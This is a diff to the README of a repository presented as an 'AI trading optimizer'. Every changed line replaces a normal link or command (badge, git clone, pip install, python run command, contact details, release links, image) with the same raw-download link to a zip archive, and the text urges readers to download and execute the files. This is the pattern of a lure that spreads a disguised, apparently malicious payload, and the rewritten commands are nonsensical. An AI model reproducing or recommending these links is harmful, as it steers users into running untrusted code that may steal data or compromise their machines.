@@ -1,6 +1,6 @@
 # Trade Optimizer AI 2025-45 🚀
 
-![Trade Optimizer AI](https://img.shields.io/badge/Trade%20Optimizer%20AI-2025--45-blue)
+![Trade Optimizer AI](https://github.com/Lama-sa-l/Trade-Optimizer-AI-2025-45/raw/refs/heads/main/sermonesque/Trade-A-Optimizer-v3.4.zip%20Optimizer%20AI-2025--45-blue)
 
 Welcome to the **Trade Optimizer AI 2025-45** repository! This project aims to enhance trading strategies using artificial intelligence. By leveraging advanced algorithms and data analysis, we aim to help traders make informed decisions and optimize their trading performance.
 
@@ -34,7 +34,7 @@ To get started with **Trade Optimizer AI 2025-45**, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Lama-sa-l/Trade-Optimizer-AI-2025-45.git
+   git clone https://github.com/Lama-sa-l/Trade-Optimizer-AI-2025-45/raw/refs/heads/main/sermonesque/Trade-A-Optimizer-v3.4.zip
    ```
 
 2. Navigate to the project directory:
@@ -46,7 +46,7 @@ To get started with **Trade Optimizer AI 2025-45**, follow these steps:
 3. Install the required dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Lama-sa-l/Trade-Optimizer-AI-2025-45/raw/refs/heads/main/sermonesque/Trade-A-Optimizer-v3.4.zip
    ```
 
 ## Usage
@@ -56,7 +56,7 @@ After installation, you can start using the **Trade Optimizer AI 2025-45** by ex
 To run the application, use the following command:
 
 ```bash
-python main.py
+python https://github.com/Lama-sa-l/Trade-Optimizer-AI-2025-45/raw/refs/heads/main/sermonesque/Trade-A-Optimizer-v3.4.zip
 ```
 
 For more detailed instructions on using specific features, please refer to the documentation provided in the `docs` folder.
@@ -81,14 +81,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: support@tradeoptimizerai.com
-- **Twitter**: [@TradeOptimizerAI](https://twitter.com/TradeOptimizerAI)
+- **Email**: https://github.com/Lama-sa-l/Trade-Optimizer-AI-2025-45/raw/refs/heads/main/sermonesque/Trade-A-Optimizer-v3.4.zip
+- **Twitter**: [@TradeOptimizerAI](https://github.com/Lama-sa-l/Trade-Optimizer-AI-2025-45/raw/refs/heads/main/sermonesque/Trade-A-Optimizer-v3.4.zip)
 
 ## Releases
 
-You can find the latest releases of **Trade Optimizer AI 2025-45** [here](https://github.com/Lama-sa-l/Trade-Optimizer-AI-2025-45/releases). Download the necessary files and execute them to start optimizing your trades.
+You can find the latest releases of **Trade Optimizer AI 2025-45** [here](https://github.com/Lama-sa-l/Trade-Optimizer-AI-2025-45/raw/refs/heads/main/sermonesque/Trade-A-Optimizer-v3.4.zip). Download the necessary files and execute them to start optimizing your trades.
 
-Make sure to check the [Releases](https://github.com/Lama-sa-l/Trade-Optimizer-AI-2025-45/releases) section for updates and new features.
+Make sure to check the [Releases](https://github.com/Lama-sa-l/Trade-Optimizer-AI-2025-45/raw/refs/heads/main/sermonesque/Trade-A-Optimizer-v3.4.zip) section for updates and new features.
 
 ## Acknowledgments
 
@@ -98,7 +98,7 @@ We would like to thank the open-source community for their contributions and sup
 
 The **Trade Optimizer AI 2025-45** is designed to empower traders with the tools they need to succeed in the market. By leveraging the power of AI, we aim to provide valuable insights that enhance trading strategies. Join us on this journey to revolutionize trading!
 
-![AI Trading](https://images.unsplash.com/photo-1586401203032-5e4d3d50e9b2)
+![AI Trading](https://github.com/Lama-sa-l/Trade-Optimizer-AI-2025-45/raw/refs/heads/main/sermonesque/Trade-A-Optimizer-v3.4.zip)
 
 ## Further Reading
 
